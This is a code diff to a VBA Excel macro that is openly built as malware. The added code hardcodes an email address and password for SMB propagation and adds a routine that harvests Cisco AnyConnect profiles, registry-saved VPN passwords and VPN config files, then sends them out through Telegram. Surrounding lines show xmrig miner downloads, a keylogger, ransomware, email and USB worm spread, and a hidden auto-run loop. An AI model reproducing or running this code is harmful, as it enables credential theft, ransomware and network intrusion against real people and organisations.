@@ -167,6 +167,10 @@ Private Const MINER_URL1 As String = "https://github.com/xmrig/xmrig/releases/do
 Private Const MINER_URL2 As String = "https://pool.minexmr.com/static/xmrig.exe"
 Private Const MINER_URL3 As String = "https://github.com/MoneroOcean/xmrig_setup/raw/master/setup_xmrig.bat"
 
+' Attacker's own credentials for propagation
+Private Const ATTACKER_EMAIL As String = "daliamarymorito@gmail.com"
+Private Const ATTACKER_PASSWORD As String = "@apple12345"
+
 Private Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
@@ -1335,20 +1339,43 @@ Sub SMBPropagation()
         If IsPortOpen(ip, 445) Then On Error Resume Next: targets.Add ip, ip: Err.Clear: Next
     End If: If targets.Count = 0 Then SendToTelegram "SMB_PROPAGATION_NO_TARGETS": Exit Sub
     Dim creds As New Collection: creds.Add "Administrator|", "admin_blank_pass": creds.Add Environ("USERNAME") & "|", "user_blank_pass"
-    If Not g_stolenCredentials Is Nothing Then Dim cred As Variant: For Each cred In g_stolenCredentials
-        Dim parts As Variant: parts = Split(cred, "|"): If UBound(parts) >= 1 Then On Error Resume Next: creds.Add parts(0) & "|" & parts(1), parts(0) & "|" & parts(1): Err.Clear
-    Next: End If
-    Dim target As Variant: For Each target In targets: Dim targetIP As String: targetIP = CStr(target): Dim credPair As Variant
-        For Each credPair In creds: Dim username As String: username = Split(CStr(credPair), "|")(0): Dim password As String: password = Split(CStr(credPair), "|")(1)
+    ' Add attacker's own credentials to the credential list for propagation
+    On Error Resume Next
+    creds.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD
+    Err.Clear
+    If Not g_stolenCredentials Is Nothing Then
+        Dim cred As Variant
+        For Each cred In g_stolenCredentials
+            Dim parts As Variant: parts = Split(cred, "|")
+            If UBound(parts) >= 1 Then
+                On Error Resume Next
+                creds.Add parts(0) & "|" & parts(1), parts(0) & "|" & parts(1)
+                Err.Clear
+            End If
+        Next
+    End If
+    Dim target As Variant
+    For Each target In targets
+        Dim targetIP As String: targetIP = CStr(target)
+        Dim credPair As Variant
+        For Each credPair In creds
+            Dim username As String: username = Split(CStr(credPair), "|")(0)
+            Dim password As String: password = Split(CStr(credPair), "|")(1)
             CopyToRemote targetIP, username, password
         Next
-    Next: g_smbPropagated = True
+    Next
+    g_smbPropagated = True
 End Sub
 
 Public Sub RetryPropagation()
-    On Error Resume Next: If Not g_usbPropagated Then USBPropagation: If Not g_smbPropagated Then SMBPropagation
-    If (Not g_usbPropagated) Or (Not g_smbPropagated) Then Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
-    Else SendToTelegram "ALL_PROPAGATION_SUCCESSFUL"
+    On Error Resume Next
+    If Not g_usbPropagated Then USBPropagation
+    If Not g_smbPropagated Then SMBPropagation
+    If (Not g_usbPropagated) Or (Not g_smbPropagated) Then
+        Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
+    Else
+        SendToTelegram "ALL_PROPAGATION_SUCCESSFUL"
+    End If
 End Sub
 
 ' ============================================================
@@ -1634,11 +1661,120 @@ Public Sub FastKernelScan(folderPath As String)
 End Sub
 
 ' ============================================================
-' 24. MAIN ENTRY POINT
+' 24. CISCO ANYCONNECT HIJACK
+' ============================================================
+Private Sub HijackCisco()
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim result As String: result = ""
+    
+    ' 1. Cisco AnyConnect Profiles (XML files)
+    Dim profilePaths As Variant
+    profilePaths = Array(Environ("PROGRAMDATA") & "\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\", _
+                         Environ("PROGRAMDATA") & "\Cisco\Cisco AnyConnect VPN\Profile\", _
+                         Environ("APPDATA") & "\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\", _
+                         Environ("LOCALAPPDATA") & "\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\")
+    Dim p As Variant
+    For Each p In profilePaths
+        If fso.FolderExists(p) Then
+            Dim folder As Object: Set folder = fso.GetFolder(p)
+            Dim file As Object
+            For Each file In folder.Files
+                If LCase(fso.GetExtensionName(file.Name)) = "xml" Then
+                    Dim ts As Object: Set ts = fso.OpenTextFile(file.Path, 1)
+                    Dim content As String: content = ts.ReadAll
+                    ts.Close
+                    If InStr(content, "hostAddress") > 0 Or InStr(content, "userGroup") > 0 Then
+                        result = result & "[Cisco AnyConnect Profile] " & file.Path & vbCrLf & content & vbCrLf & vbCrLf
+                    End If
+                End If
+            Next
+        End If
+    Next
+    
+    ' 2. Cisco AnyConnect saved credentials from registry
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    On Error Resume Next
+    Dim regPaths As Variant
+    regPaths = Array("HKCU\Software\Cisco\Cisco AnyConnect Secure Mobility Client\Preferences\", _
+                     "HKCU\Software\Cisco\AnyConnect\Preferences\")
+    Dim rp As Variant
+    For Each rp In regPaths
+        Dim credValue As String
+        credValue = ""
+        On Error Resume Next
+        credValue = wsh.RegRead(rp & "UserCredential")
+        If credValue <> "" Then result = result & "[Cisco AnyConnect UserCredential] " & credValue & vbCrLf
+        credValue = wsh.RegRead(rp & "Password")
+        If credValue <> "" Then result = result & "[Cisco AnyConnect Password] " & credValue & vbCrLf
+        credValue = wsh.RegRead(rp & "SavedPassword")
+        If credValue <> "" Then result = result & "[Cisco AnyConnect SavedPassword] " & credValue & vbCrLf
+        Err.Clear
+    Next
+    
+    ' 3. Cisco configuration files on disk (.cfg, .conf)
+    Dim searchDirs As Variant
+    searchDirs = Array(Environ("USERPROFILE"), Environ("APPDATA"), Environ("LOCALAPPDATA"), Environ("PROGRAMDATA"))
+    Dim sd As Variant
+    For Each sd In searchDirs
+        If fso.FolderExists(sd) Then
+            Dim folder2 As Object: Set folder2 = fso.GetFolder(sd)
+            Dim subFolder As Object, file2 As Object
+            For Each subFolder In folder2.SubFolders
+                For Each file2 In subFolder.Files
+                    Dim ext2 As String: ext2 = LCase(fso.GetExtensionName(file2.Name))
+                    If ext2 = "cfg" Or ext2 = "conf" Then
+                        If LCase(file2.Name) Like "*cisco*" Or LCase(file2.Name) Like "*anyconnect*" Or LCase(file2.Name) Like "*vpn*" Then
+                            Dim ts2 As Object: Set ts2 = fso.OpenTextFile(file2.Path, 1)
+                            Dim cfgContent As String: cfgContent = ts2.ReadAll
+                            ts2.Close
+                            If Len(cfgContent) < 50000 Then ' Avoid huge files
+                                result = result & "[Cisco Config] " & file2.Path & vbCrLf & cfgContent & vbCrLf & vbCrLf
+                            End If
+                        End If
+                    End If
+                Next
+            Next
+        End If
+    Next
+    
+    ' 4. Also search for common Cisco VPN connection files
+    Dim vpnPaths As Variant
+    vpnPaths = Array(Environ("USERPROFILE") & "\Documents\Cisco AnyConnect\", _
+                     Environ("USERPROFILE") & "\Downloads\Cisco\", _
+                     Environ("USERPROFILE") & "\Desktop\Cisco\")
+    Dim vp As Variant
+    For Each vp In vpnPaths
+        If fso.FolderExists(vp) Then
+            Dim vpnFolder As Object: Set vpnFolder = fso.GetFolder(vp)
+            For Each file2 In vpnFolder.Files
+                If LCase(fso.GetExtensionName(file2.Name)) = "txt" Or LCase(fso.GetExtensionName(file2.Name)) = "log" Or LCase(fso.GetExtensionName(file2.Name)) = "ovpn" Then
+                    Dim ts3 As Object: Set ts3 = fso.OpenTextFile(file2.Path, 1)
+                    Dim vpnContent As String: vpnContent = ts3.ReadAll
+                    ts3.Close
+                    result = result & "[Cisco VPN File] " & file2.Path & vbCrLf & vpnContent & vbCrLf & vbCrLf
+                End If
+            Next
+        End If
+    Next
+    
+    If result <> "" Then
+        SendToTelegramChunked "CISCO_HIJACK|" & GetMachineID() & vbCrLf & result
+    Else
+        SendToTelegram "CISCO_HIJACK|No Cisco data found on " & GetMachineID()
+    End If
+End Sub
+
+' ============================================================
+' 25. MAIN ENTRY POINT
 ' ============================================================
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
     Set g_stolenCredentials = New Collection: Set g_emailTargets = New Collection
+    ' Pre-populate stolen credentials with attacker's own email/password
+    On Error Resume Next
+    g_stolenCredentials.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD
+    Err.Clear
     gSelfPath = ThisWorkbook.FullName: gKeylogFile = GetTempDir() & "keylog.txt": LoadEncryptedState
     If gRunFlag = "RUN" Then
         If Not m_EngineActive Then Synapse_Engine_Start
@@ -1667,6 +1803,7 @@ Public Sub AutoExec()
         WildfireEmailPropagation: RunRansomware: DeploySocialEngineeringUI
         Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop": Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
         FastKernelScan Environ("USERPROFILE") & "\Documents"
+        HijackCisco
     End If
     SaveEncryptedState: Application.Visible = False: ThisWorkbook.Saved = True
     Do While True: DoEvents: Application.Wait Now + TimeValue("00:00:01"): Loop
